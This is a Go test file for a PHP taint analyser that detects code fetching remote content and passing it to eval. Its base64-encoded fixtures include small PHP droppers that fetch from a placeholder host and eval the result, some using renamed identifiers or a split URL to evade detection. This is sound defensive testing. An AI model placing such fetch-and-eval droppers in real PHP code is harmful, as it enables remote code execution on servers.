package phptaint

import (
	"context"
	"encoding/base64"
	"fmt"
	"reflect"
	"strings"
	"testing"
	"time"
)

func b64(s string) string { return base64.StdEncoding.EncodeToString([]byte(s)) }

// Fixtures mirror the motivating sample and the two evasions that defeated
// the rejected regex approaches.
var (
	fxMotivating = b64(`<?php
function fetchContent($url) {
    $ch = curl_init($url);
    $data = curl_exec($ch);
    return $data;
}
$content = fetchContent('http://host/p.txt');
eval('?>' . $content);`)

	fxRenamed = b64(`<?php
function zqx($a) { $b = curl_init($a); $c = curl_exec($b); return $c; }
$q7 = zqx('http://host/p.txt');
eval('?>' . $q7);`)

	fxSplitURL = b64(`<?php
function grab($u) { return file_get_contents($u); }
$h = 'ho' . 'st';
$p = 'http://' . $h . '/payload';
$x = grab($p);
eval($x);`)

	// Each benign fixture below carries one unrelated, non-flowing call from
	// whichever keyword class (source/sink) its scenario otherwise lacks.
	// isCandidate requires both a source and a sink keyword present in the
	// byte stream before parsing runs at all (see TestPrefilterRejectsWithoutBothHalves
	// in prefilter_test.go); a fixture with only one half is StatusNotCandidate,
	// never reaching the deep analysis this test exercises.
	fxBenignLiteral = b64(`<?php
$cache = file_get_contents(__DIR__ . '/cache.json');
$code = 'return 1 + 1;';
eval($code);`)
	fxBenignEcho = b64(`<?php
function fetchContent($url) { return file_get_contents($url); }
$content = fetchContent('http://host/feed.xml');
echo htmlspecialchars($content);
include __DIR__ . '/parts/header.php';`)
	fxBenignInclude = b64(`<?php
$cache = file_get_contents('/etc/local-cache.txt');
$tpl = __DIR__ . '/parts/header.php';
include $tpl;`)
)

func run(t *testing.T, fixture string) Report {
	t.Helper()
	src, err := base64.StdEncoding.DecodeString(fixture)
	if err != nil {
		t.Fatalf("decode fixture: %v", err)
	}
	return Analyze(context.Background(), src)
}

func TestDetectsMotivatingSample(t *testing.T) {
	rep := run(t, fxMotivating)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("no flow reported for the motivating dropper")
	}
	if rep.Results[0].Sink != "eval" {
		t.Errorf("sink = %q, want eval", rep.Results[0].Sink)
	}
}

func TestDetectsRenamedIdentifiers(t *testing.T) {
	if len(run(t, fxRenamed).Results) == 0 {
		t.Fatal("renaming identifiers evaded detection")
	}
}

func TestDetectsSplitURL(t *testing.T) {
	if len(run(t, fxSplitURL).Results) == 0 {
		t.Fatal("splitting the URL across concatenation evaded detection")
	}
}

func TestBenignControlsReportNothing(t *testing.T) {
	for name, fx := range map[string]string{
		"literal": fxBenignLiteral,
		"echo":    fxBenignEcho,
		"include": fxBenignInclude,
	} {
		rep := run(t, fx)
		if rep.Status != StatusAnalyzed {
			t.Errorf("%s: status = %v (%s)", name, rep.Status, rep.Reason)
			continue
		}
		if len(rep.Results) != 0 {
			t.Errorf("%s: false positive: %+v", name, rep.Results)
		}
	}
}

func TestFunctionLocalDoesNotTaintTopLevelSameName(t *testing.T) {
	// A function-local variable must not taint an unrelated top-level
	// variable that merely shares its name.
	src := b64(`<?php
function fetch($c) { $tmp = curl_exec($c); return $tmp; }
$tmp = 'safe literal';
eval($tmp);`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	for _, r := range rep.Results {
		if r.Sink == "eval" {
			t.Fatalf("false positive: clean top-level $tmp reported as %+v", r)
		}
	}
}

// TestConditionalFunctionDeclarationDoesNotLeak is the real WordPress
// idiom: guarding a function declaration with function_exists so a plugin
// can be included more than once. The declaration is not a direct
// top-level statement -- it is wrapped in an if -- so a filter keyed on
// the direct statement type at the top of a scope would miss it and let
// the inner $content taint the unrelated top-level $content.
func TestConditionalFunctionDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! function_exists( 'theme_fetch' ) ) {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestConditionalClassDeclarationDoesNotLeak is the class_exists sibling of
// the function_exists guard: a class (and its method) declared inside an
// if must not leak the method's local into an identically-named top-level
// variable either.
func TestConditionalClassDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( ! class_exists( 'Theme_Fetcher' ) ) {
	class Theme_Fetcher {
		function fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestTryWrappedDeclarationDoesNotLeak checks a different wrapper (try) to
// confirm the fix is not a special case for if: the library traverser
// recurses through every control-flow construct the same way, so the
// exclusion must be wrapper-agnostic.
func TestTryWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
try {
	function theme_fetch( $url ) {
		$content = curl_exec( $url );
		return $content;
	}
} catch ( Throwable $e ) {
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestDoublyWrappedDeclarationDoesNotLeak nests a declaration two wrappers
// deep. Exclusion is position-based, not keyed to any particular wrapper
// depth, so this must hold regardless of how many layers separate the
// declaration from the top level.
func TestDoublyWrappedDeclarationDoesNotLeak(t *testing.T) {
	src := b64(`<?php
if ( true ) {
	foreach ( array( 1 ) as $i ) {
		function theme_fetch( $url ) {
			$content = curl_exec( $url );
			return $content;
		}
	}
}
$content = 'safe literal from options';
eval( $content );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// TestSinkInsideWrapperAtTopLevelIsDetected is the false-negative guard: a
// sink that genuinely belongs to the top-level scope, merely sitting
// inside an if, must still be detected. Excluding a declaration's own span
// must never over-narrow into excluding ordinary control flow that isn't a
// declaration at all.
func TestSinkInsideWrapperAtTopLevelIsDetected(t *testing.T) {
	src := b64(`<?php
$tainted = curl_exec($h);
if ($tainted) {
	eval($tainted);
}`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("false negative: sink genuinely at top level, wrapped in if, was not detected")
	}
}

// TestAnonymousClassMethodDoesNotLeak closes the same leak for an anonymous
// class assigned to a top-level variable. Its method is not a direct
// top-level statement either -- it is nested inside an ExprNew inside an
// assignment -- so this is covered by the same position-based exclusion as
// the named-declaration cases above, with no special case required.
func TestAnonymousClassMethodDoesNotLeak(t *testing.T) {
	src := b64(`<?php
$obj = new class {
	function get( $c ) {
		$tmp = curl_exec( $c );
		return $tmp;
	}
};
$tmp = 'safe literal';
eval( $tmp );`)
	rep := run(t, src)
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) != 0 {
		t.Fatalf("false positive: %+v", rep.Results)
	}
}

// manyDeclSource builds n trivial function declarations followed by one
// genuine curl_exec-to-eval flow, so a test can tell "this analyzed
// correctly at scale" apart from "this merely returned quickly because
// nothing was found."
func manyDeclSource(n int) []byte {
	var src strings.Builder
	src.WriteString("<?php\n")
	for i := 0; i < n; i++ {
		fmt.Fprintf(&src, "function decl%d(){}\n", i)
	}
	src.WriteString("$d = curl_exec($h);\neval($d);\n")
	return []byte(src.String())
}

// TestLargeDeclarationFileAnalyzesCorrectly is the regression guard for the
// quadratic declaration-exclusion bug: declarationTree must build its
// shared index once per file, not once per declaration (which was
// O(D^2 log D) and measured taking double-digit seconds at tens of
// thousands of declarations). 15,000 is comfortably inside maxDeclarations,
// so this must complete as a normal StatusAnalyzed result.
//
// This intentionally does NOT assert on wall-clock time -- a numeric
// threshold is exactly the kind of thing that is flaky under shared CI
// load. The regression guard here is twofold and both parts are
// deterministic: (1) correctness -- the genuine flow appended after the
// 15,000 declarations must still be found, which only happens if every
// declaration's exclusion index was built correctly; a test that merely
// checked "did not time out" could pass even if the algorithm silently
// produced wrong results. (2) the test framework's own timeout is the
// backstop against a reintroduced quadratic: at this scale the shared-index
// approach finishes in tens of milliseconds (elapsed is logged, not
// asserted, purely for visibility), while a reintroduced O(D^2 log D) would
// take on the order of a second at this size and grow from there --
// self-evidently against `go test`'s default per-package timeout if the
// regression is severe, without this test encoding any specific duration.
func TestLargeDeclarationFileAnalyzesCorrectly(t *testing.T) {
	src := manyDeclSource(15_000)
	start := time.Now()
	rep := Analyze(context.Background(), src)
	t.Logf("15000 declarations analyzed in %v", time.Since(start))
	if rep.Status != StatusAnalyzed {
		t.Fatalf("status = %v (%s)", rep.Status, rep.Reason)
	}
	if len(rep.Results) == 0 {
		t.Fatal("genuine flow after 15,000 declarations was not detected")
	}
}

// TestDeclarationLimitReportsCoverageGap confirms the defence-in-depth cap
// fires as a coverage gap, never a silent skip: a file whose declaration
// count exceeds maxDeclarations must report StatusResourceLimit -- meaning
// the file was NOT examined -- rather than StatusAnalyzed with an
// incomplete (and therefore falsely "clean") result.
func TestDeclarationLimitReportsCoverageGap(t *testing.T) {
	src := manyDeclSource(maxDeclarations + 1)
	rep := Analyze(context.Background(), src)
	if rep.Status != StatusResourceLimit {
		t.Fatalf("status = %v, want StatusResourceLimit for %d declarations", rep.Status, maxDeclarations+1)
	}
	if len(rep.Results) != 0 {
		t.Errorf("results = %+v, want none for a coverage-gap status", rep.Results)
	}
}

func TestResultsAreDeterministic(t *testing.T) {
	first := run(t, fxMotivating)
	for i := 0; i < 5; i++ {
		again := run(t, fxMotivating)
		if len(again.Results) != len(first.Results) {
			t.Fatalf("run %d: result count changed", i)
		}
		for j := range first.Results {
			// Result.Via is a []string, so Result is not comparable with !=;
			// reflect.DeepEqual preserves the same byte-identical intent.
			if !reflect.DeepEqual(again.Results[j], first.Results[j]) {
				t.Fatalf("run %d result %d differs", i, j)
			}
		}
	}
}
